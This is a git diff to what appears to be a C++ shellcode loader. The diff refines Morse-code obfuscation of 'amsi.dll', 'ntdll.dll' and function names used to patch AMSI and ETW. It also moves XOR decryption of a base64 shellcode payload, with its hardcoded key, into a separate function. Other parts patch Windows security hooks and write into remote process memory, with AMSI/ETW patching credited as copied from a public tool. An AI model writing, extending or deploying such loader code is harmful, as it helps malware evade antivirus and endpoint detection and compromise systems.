@@ -13,7 +13,7 @@ using namespace std;
 
 map< char, string > ascii_to_morse =
 {
-{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},
+{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},{'.',"^^^.__-"},
 };
 
 void tokenize(std::string const& str, const char delim,
@@ -66,7 +66,7 @@ DWORD get_PPID() {
 //code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
 void patchAMSI(OUT HANDLE& hProc) {
 
-    LPSTR s = const_cast<char*>(translate_morse(".- -- ... .. -.. .-.. .-..").c_str());
+    LPSTR s = const_cast<char*>(translate_morse(".- -- ... .. ^^^.__- -.. .-.. .-..").c_str());
     LPSTR l = const_cast<char*>(translate_morse("^.- -- ... .. ^... -.-. .- -. ^-... ..- ..-. ..-. . .-.").c_str());
     void* amsiAddr = GetProcAddress(LoadLibraryA(s), l);
 
@@ -86,7 +86,7 @@ void patchAMSI(OUT HANDLE& hProc) {
 //code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
 void patchAMSIOpenSession(OUT HANDLE& hProc) {
 
-    LPSTR s = const_cast<char*>(translate_morse(".- -- ... .. -.. .-.. .-..").c_str());
+    LPSTR s = const_cast<char*>(translate_morse(".- -- ... .. ^^^.__- -.. .-.. .-..").c_str());
     LPSTR l = const_cast<char*>(translate_morse("^.- -- ... .. ^--- .--. . -. ^... . ... ... .. --- -.").c_str());
     void* amsiAddr = GetProcAddress(LoadLibraryA(s), l);
 
@@ -105,7 +105,7 @@ void patchAMSIOpenSession(OUT HANDLE& hProc) {
 
 //code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
 void patchETW(OUT HANDLE& hProc) {
-    LPSTR s = const_cast<char*>(translate_morse("-. - -.. .-.. .-.. -.. .-.. .-..").c_str());
+    LPSTR s = const_cast<char*>(translate_morse("-. - -.. .-.. .-.. ^^^.__- -.. .-.. .-..").c_str());
     LPSTR l = const_cast<char*>(translate_morse("^ . - .-- ^ . ... - . - . - ^ .-- . - . .. - .").c_str());
     void* etwAddr = GetProcAddress(GetModuleHandle((LPCTSTR)s), l);
 
@@ -197,6 +197,22 @@ void howlow_sc(std::vector<byte> recovered)
     uint8_t overwrite[500];
     NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);
 }
+
+std::string XOR(std::string decoded, std::string xorKey)
+{
+    char x0rek3y[19];
+    for (int k = 0; k < xorKey.length(); k++) x0rek3y[k] = xorKey[k];
+
+    int j = 0;
+    for (int i = 0; i < decoded.size(); i++) {
+        if (j == sizeof x0rek3y - 1) j = 0;
+
+        decoded[i] = decoded[i] ^ x0rek3y[j];
+        j++;
+    }
+    return decoded;
+}
+
 int main()
 {
     //implement privilege escalation here
@@ -225,9 +241,10 @@ int main()
 
     decoded = b64.base64_decode(sh3llc0de);
 
-    //xor
+    //xor is already in its own function
     //char x0rek3y[] = "Sup3rS3cur3K3yfTw!";
     //initialize xorKey in a weird way
+    /*
     char x0rek3y[19];
     for (int k = 0; k < xorKey.length(); k++) x0rek3y[k] = xorKey[k];
 
@@ -238,6 +255,8 @@ int main()
         decoded[i] = decoded[i] ^ x0rek3y[j];
         j++;
     }
+    */
+    decoded = XOR(decoded, xorKey);
 
     ciphertext.clear();
     std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));
